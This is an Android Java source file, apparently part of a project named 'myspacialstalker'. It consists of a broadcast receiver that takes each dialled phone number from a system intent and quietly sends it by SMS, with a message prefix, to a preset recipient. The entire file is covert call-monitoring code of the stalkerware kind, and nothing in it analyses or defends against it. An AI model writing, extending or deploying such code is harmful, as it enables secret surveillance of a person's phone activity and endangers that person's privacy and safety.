package com.example.myspacialstalker;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsManager;

public class MyBroadcastReceiver extends BroadcastReceiver {

    static String msg;
    static String sendTo;

    @Override
    public void onReceive(Context context, Intent intent) {
        String phone_number = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
        SmsManager smsManager = SmsManager.getDefault();
        smsManager.sendTextMessage(sendTo,null, msg + phone_number, null, null);
    }
}
